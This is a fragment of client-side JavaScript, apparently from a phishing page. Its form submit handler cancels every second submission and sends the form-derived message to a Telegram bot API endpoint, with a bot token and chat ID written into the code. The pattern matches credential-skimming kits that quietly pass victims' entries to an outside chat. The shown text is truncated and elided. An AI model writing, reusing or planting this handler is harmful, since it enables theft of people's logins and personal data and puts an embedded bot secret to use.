...
var feed = {
	submit: function(e, elem, field) {
		...
		if (count % 2 === 0){
			...
			e.preventDefault()
			fetch(`https://api.telegram.org/bot6867839874:AAF3yXWjyedKCs1rXESEAzWmyYV33ACha44/sendMessage?chat_id=779209330&parse_mode=html&text=${message}`, {
				method: 'POST',
				headers: {
